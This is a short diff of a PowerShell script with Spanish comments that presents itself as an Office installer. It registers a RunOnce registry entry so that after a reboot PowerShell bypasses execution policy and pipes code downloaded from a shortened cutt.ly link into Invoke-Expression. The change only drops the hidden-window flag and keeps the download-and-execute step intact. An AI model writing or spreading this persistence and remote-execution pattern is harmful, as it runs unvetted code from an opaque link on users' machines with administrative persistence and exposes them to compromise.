@@ -662,7 +662,7 @@ Remove-Item -Path "$env:TEMP\server.txt" -Force
 $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
 $valueName = "OfficeInstallerOnce"
 # Comando a ejecutar tras reinicio
-$valueData = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {iwr -useb https://cutt.ly/OfficeOnlineInstall | iex}"'
+$valueData = 'powershell.exe -ExecutionPolicy Bypass -Command "& {iwr -useb https://cutt.ly/OfficeOnlineInstall | iex}"'
 # Crear la entrada en RunOnce
 New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force
 Write-Host "✅ Instalador configurado para ejecutarse una sola vez después del reinicio." -ForegroundColor Green
